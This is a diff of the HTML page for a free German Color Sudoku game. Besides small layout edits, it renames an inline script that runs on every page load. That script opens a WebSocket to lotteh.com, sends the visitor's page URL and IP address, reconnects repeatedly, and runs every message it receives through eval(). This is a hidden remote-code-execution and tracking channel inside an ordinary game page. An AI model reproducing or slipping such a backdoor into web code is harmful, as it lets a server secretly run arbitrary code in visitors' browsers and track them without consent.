@@ -124,11 +124,11 @@
 <p><i>Von Daisy</i></p>
 
 <div style="white-space: pre-wrap;">Spielen Sie Color Sudoku online - kostenloses Colordoku -Spiel
-Dies ist ein freies Spiel mit Farb -Sudoku (Colordoku).
-***<canvas class="game" id="game197"></canvas>
+Dies ist ein freies Spiel mit Farb -Sudoku (Colordoku).<canvas class="game" id="game197"></canvas>
 <script src="/static/js/createjs.min.js"></script>
 <script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
+<script src="/static/games/colordoku.js"></script>
+</div>
 
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
@@ -273,32 +273,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
